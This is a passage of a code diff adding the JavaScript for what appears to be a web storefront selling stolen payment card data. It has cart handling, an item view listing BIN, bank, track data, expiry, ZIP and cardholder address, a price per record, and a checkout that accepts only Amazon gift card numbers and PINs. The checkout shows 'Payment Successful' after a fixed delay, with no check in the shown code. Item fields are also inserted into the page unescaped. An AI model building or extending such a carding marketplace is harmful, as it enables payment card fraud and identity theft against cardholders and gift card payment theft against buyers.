+
+        function updateCartBadge() {
+            document.getElementById('cart-count').innerText = cart.length;
+        }
+
+        function renderCart() {
+            const container = document.getElementById('cart-items-container');
+            const summary = document.getElementById('cart-summary');
+
+            if (cart.length === 0) {
+                container.innerHTML = `<p class="text-slate-500 text-center py-10 italic">Your cart is empty.</p>`;
+                summary.classList.add('hidden');
+                return;
+            }
+
+            container.innerHTML = '';
+            let total = 0;
+
+            cart.forEach((item, index) => {
+                total += item.price;
+                const div = document.createElement('div');
+                div.className = "flex justify-between items-center bg-slate-900/50 p-2 rounded border border-slate-700";
+                div.innerHTML = `
+                    <div class="flex items-center gap-2">
+                        <span class="font-mono font-bold text-cyan-400">${item.bin}</span>
+                        <span class="text-slate-500 text-[10px]">(${item.type} - ${item.bank})</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="font-bold text-white">$${item.price.toFixed(2)}</span>
+                        <button onclick="removeFromCart(${index})" class="text-red-400 hover:text-red-300"><i class="fas fa-trash"></i></button>
+                    </div>
+                `;
+                container.appendChild(div);
+            });
+
+            document.getElementById('cart-total-price').innerText = `$${total.toFixed(2)}`;
+            summary.classList.remove('hidden');
+        }
+
+        function removeFromCart(index) {
+            cart.splice(index, 1);
+            renderCart();
+            updateCartBadge();
+        }
+
+        function clearCart() {
+            cart = [];
+            renderCart();
+            updateCartBadge();
+        }
+
+        // --- CHECKOUT TERMINAL (AMAZON GC ONLY) ---
+        function openCheckoutTerminal() {
+            if(cart.length === 0) return;
+
+            const modal = document.getElementById('checkout-modal');
+            const list = document.getElementById('checkout-items-list');
+            const totalEl = document.getElementById('checkout-modal-total');
+
+            list.innerHTML = '';
+            let total = 0;
+            cart.forEach(item => {
+                total += item.price;
+                const div = document.createElement('div');
+                div.className = "flex justify-between text-slate-400";
+                div.innerHTML = `<span>${item.bin} (${item.type})</span><span>$${item.price.toFixed(2)}</span>`;
+                list.appendChild(div);
+            });
+
+            totalEl.innerText = `$${total.toFixed(2)}`;
+            modal.classList.remove('hidden');
+
+            // Reset fields
+            document.getElementById('gc-number').value = '';
+            document.getElementById('gc-pin').value = '';
+            document.getElementById('payment-status-area').classList.add('hidden');
+            document.getElementById('pay-loader').classList.add('hidden');
+            document.querySelector('#authorize-payment-btn span').innerText = "Verify & Pay";
+            document.querySelector('#authorize-payment-btn').disabled = false;
+        }
+
+        function closeCheckoutTerminal() {
+            document.getElementById('checkout-modal').classList.add('hidden');
+        }
+
+        function processAmazonGC() {
+            const gcNum = document.getElementById('gc-number').value.trim();
+            const pin = document.getElementById('gc-pin').value.trim();
+            const btn = document.getElementById('authorize-payment-btn');
+            const loader = document.getElementById('pay-loader');
+            const statusArea = document.getElementById('payment-status-area');
+            const btnText = btn.querySelector('span');
+
+            if(!gcNum || !pin) {
+                showToast("Please enter both Card Number and PIN", "error");
+                return;
+            }
+
+            // UI Loading State
+            btn.disabled = true;
+            loader.classList.remove('hidden');
+            btnText.innerText = "Verifying...";
+
+            setTimeout(() => {
+                loader.classList.add('hidden');
+                statusArea.classList.remove('hidden');
+                statusArea.innerHTML = '<span class="text-emerald-400 font-bold"><i class="fas fa-check-circle mr-1"></i> Payment Successful!</span>';
+                btnText.innerText = "Success";
+                
+                setTimeout(() => {
+                    closeCheckoutTerminal();
+                    cart = [];
+                    updateCartBadge();
+                    showToast("Items delivered to dashboard!", "success");
+                }, 1500);
+            }, 2000);
+        }
+
+        // --- ITEM ANALYSIS MODAL ---
+        function showItemAnalysis(item) {
+            const modal = document.getElementById('item-modal');
+            const content = document.getElementById('item-modal-content');
+            
+            content.innerHTML = `
+                <div class="grid grid-cols-2 gap-2">
+                    <div class="text-slate-500">BIN:</div><div class="text-white font-bold">${item.bin}</div>
+                    <div class="text-slate-500">Type:</div><div class="text-white">${item.type}</div>
+                    <div class="text-slate-500">Bank:</div><div class="text-white">${item.bank}</div>
+                    <div class="text-slate-500">Level:</div><div class="text-white">${item.level}</div>
+                    <div class="text-slate-500">Exp:</div><div class="text-white">${item.exp}</div>
+                    <div class="text-slate-500">Track:</div><div class="text-white">${item.track}</div>
+                    <div class="text-slate-500">ZIP:</div><div class="text-white">${item.zip}</div>
+                    <div class="text-slate-500">Address:</div><div class="text-white break-all">${item.address}, ${item.city}, ${item.state}</div>
+                    <div class="text-slate-500">Status:</div><div class="text-white">${item.status}</div>
+                    <div class="text-slate-500">Price:</div><div class="text-emerald-400 font-bold">$${item.price.toFixed(2)}</div>
+                </div>
+            `;
+            
+            document.getElementById('modal-add-cart-btn').onclick = (e) => {
+                addToCart(e, item.id);
+                closeItemModal();
+            };
+
+            modal.classList.remove('hidden');
+        }
+
+        function closeItemModal() {
+            document.getElementById('item-modal').classList.add('hidden');
+        }
+
+        // --- UTILITIES ---
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            const icon = document.getElementById('toast-icon');
+            const msg = document.getElementById('toast-msg');
+            
+            msg.innerText = message;
+            
+            if (type === 'error') {
+                icon.className = 'fas fa-exclamation-circle text-red-400';
+            } else if (type === 'warning') {
+                icon.className = 'fas fa-info-circle text-yellow-400';
+            } else {
+                icon.className = 'fas fa-check-circle text-emerald-400';
+            }
+
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            toast.classList.add('translate-y-0', 'opacity-100');
+
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+                toast.classList.remove('translate-y-0', 'opacity-100');
+            }, 3000);
+        }
+
+        function toggleSelectAll(source) {
+            const checkboxes = document.querySelectorAll('.row-select');
+            checkboxes.forEach(cb => cb.checked = source.checked);
+        }
+
+        function initAuction() {
+            // Simple countdown timer simulation
+            let timeLeft = 299; // 4:59
+            const timerEl = document.getElementById('auction-timer');
+            
+            setInterval(() => {
+                if(timeLeft <= 0) timeLeft = 300;
+                timeLeft--;
+                const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+                const s = (timeLeft % 60).toString().padStart(2, '0');
+                timerEl.innerText = `${m}:${s}`;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
